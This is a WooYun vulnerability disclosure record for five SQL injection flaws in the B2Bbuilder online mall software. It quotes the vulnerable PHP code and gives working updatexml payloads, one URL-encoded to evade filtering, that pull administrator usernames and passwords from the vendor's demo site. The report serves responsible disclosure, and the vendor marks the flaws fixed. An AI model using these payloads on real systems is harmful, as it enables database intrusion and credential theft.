{"id": 31844, "wybug_id": "wooyun-2015-0112940", "wybug_title": "B2Bbuilder网上商城五处sql注入打包(demo成功)", "wybug_corp": "shop-builder.cn", "wybug_author": "路人甲", "wybug_date": "2015-05-19 11:51", "wybug_open_date": "2015-08-18 09:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-18：\t细节向公众公开  简要描述： rt 详细说明：  注入1############################################################################看到module\\company\\admin\\business_info_list.php\n<?php$status=array('-1'=>lang_show('notpass'),'0'=>lang_show('wpass'),'1'=>lang_show('auditpass')); if(isset($_GET['step'])){\tif($_GET['step']==\"del\")\t{\t\t$db->query(\"delete from \".CERTIFICATION.\" where id='$_GET[deid]'\");\t\t$sql=\"update \".COMPANY.\" set certification='0' where company_id in (select company_id from \".CERTIFICATION.\" where id='$_GET[deid]')\";\t\t$db->query($sql);\t}}if(isset($_POST['del'])){\t$ids=implode(\",\",$_POST['del']);\t$sql=\"update  \".CERTIFICATION.\" set statu=1 where id in ($ids)\";\t$db->query($sql);\t\t$sql=\"update \".COMPANY.\" set certification='1' where company_id in (select company_id from \".CERTIFICATION.\" where id in ($ids))\";\t$db->query($sql);}?>\n其中del未过滤进入sql中，造成注入。我们用demo测试http://democn.b2b-builder.com账号密码 test test构造urlhttp://democn.b2b-builder.com/main.php?m=company&s=admin/business_info_listpost数据包为\ndel[]=1) or updatexml(2,concat(0x7e,((select group_concat(user,0x5e,password) from hy_admin))),0) %23&updateID=11&cc=1111\n\n\n注入2############################################################################看到module\\buy\\admin\\add_cart.php\nif(!empty($_POST[\"cat\"])&&!empty($_GET[\"id\"])){\t\t$ext_table=$config['table_pre'].'defind_'.$_POST['ext_field_cat'];\t$_POST['ext_field_cat']*=1;\t\tif($_POST['pid']!=0)\t{\t\tif($_POST[\"pid\"]!==substr($_GET['id'],0,strlen($_GET['id'])-2))\t\t{\t\t\t$s=$_POST[\"pid\"].\"00\";\t\t\t$b=$_POST[\"pid\"].\"99\";\t\t\t$sql=\"select max(catid) as catid from $cat_table where catid>$s and catid<$b\";\t\t\t$db->query($sql);\t\t\t$re=$db->fetchRow();\t\t\t$id=$re[\"catid\"];\t\t\tif(!$id)\t\t\t\t$id=$_POST[\"pid\"].\"01\";\t\t\telse\t\t\t\t$id=$id+1;\t\t}\t\telse\t\t\t$id=$_GET['id'];\t\t//编辑当前类别信息\t\t$sql=\"update $cat_table set catid='$id', cat='\".$_POST['cat'].\"',isindex='\".$isindex.\"' \t\t\t,pic='$_POST[pic]',brand='$_POST[brand]',ext_table='$ext_table',ext_field_cat='$_POST[ext_field_cat]',template='$_POST[template]' where catid='\".$_GET['id'].\"'\";\t\t$re=$db->query($sql);\t\t//如果当前类别下面带有子类别把子类别一起移过去\t\t$s=$_GET['id'].\"00\";\t\t$b=$_GET['id'].\"99\";\t\t$sql=\"update $cat_table set catid=replace(catid,$_GET[id],$id) where catid>=$s and catid<=$b\";\t\t$re=$db->query($sql);\t}\n只要满足!empty($_POST[\"cat\"])&&!empty($_GET[\"id\"]就会进入下面的流程。然后$s为被单引号包裹，直接进入sql语句。然后造成sql注入。首先注册一个账号http://democn.b2b-builder.com账号密码都为test然后构造http://democn.b2b-builder.com/main.php?m=buy&s=admin/add_cat&id=111其中post数据包为\ncat=1&pid=1  or updatexml(2,concat(0x7e,((select group_concat(user,0x5e,password) from hy_admin))),0) %23\n\n\n注入3############################################################################看到\\module\\company\\space_mail.php\nif(!empty($_GET['tid'])&&is_array($_GET['tid']))\t$tid=implode(',',$_GET['tid']);elseif(!empty($_GET['tid']))\t$tid=$_GET['tid'];if(!empty($tid)){\t$sql=\"select id,title from \".INFO.\" WHERE id in ($tid)\";\t$db->query($sql);\t$res=$db->getRows();\t$tpl->assign(\"res\",$res);\t$tpl->assign(\"tid\",$tid);}\ntid直接进入sql中，造成注入。首先注册一个用户。http://democn.b2b-builder.com账号密码都为test然后访问http://democn.b2b-builder.com/main.php?m=company&s=space_mail&tid=xxx\n\n然后直接构造语句会被拦截，要urlencode。最后exp为\nhttp://democn.b2b-builder.com/main.php?m=company&s=space_mail&tid=%31%29%20%6F%72%20%75%70%64%61%74%65%78%6D%6C%28%32%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%28%28%73%65%6C%65%63%74%20%67%72%6F%75%70%5F%63%6F%6E%63%61%74%28%75%73%65%72%2C%30%78%35%65%2C%70%61%73%73%77%6F%72%64%29%20%66%72%6F%6D%20%68%79%5F%61%64%6D%69%6E%29%29%29%2C%30%29%20%23\n\n\n注入4&5############################################################################看到module\\message\\inquiry_basket.php\nif(!empty($_COOKIE['com_inquery'])){\t$sql=\"select company,ctype as subject,admin as userid from \".COMPANY.\" where admin in ($_COOKIE[com_inquery])\";  //注入4\t$db->query($sql);\t$re=$db->getRows();\t$tpl->assign(\"comlist\",$re);}if(!empty($_COOKIE['offer_inquery'])){\t$offers=explode(\",\",$_COOKIE['offer_inquery']);\tforeach($offers as $v)\t{\t\tif(!empty($v))\t\t{\t\t\t$offer_array[]=$v*1;\t\t}\t}\tif($offer_array)\t{\t\t$offers=implode(\",\",$offer_array);\t\t\t\t$sql=\"select company,title as subject,userid,id from \".INFO.\" b where b.id in($offers)\";  //注入5\t\t$db->query($sql);\t\t$re=$db->getRows();\t\t$tpl->assign(\"infolist\",$re);\t}}\n其中cookie的参数直接带入sql造成注入。首先注册一个用户http://democn.b2b-builder.com/账户密码都为test然后访问http://democn.b2b-builder.com/main.php?m=message&s=inquiry_basket修改cookie为com_inquery:xxxx可以看到报错了。\n\n然后构造\n1) or updatexml(2,concat(0x7e,((select group_concat(user,0x5e,password) from hy_admin))),0) %23\n\n\n注入5类似   漏洞证明：  \n\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-05-20 09:21 厂商回复： 非常感谢 最新状态： 2015-05-25：已修复  ", "replys": "漏洞评价：\n评论\n     2015-06-17 12:44 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  坐等公开    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}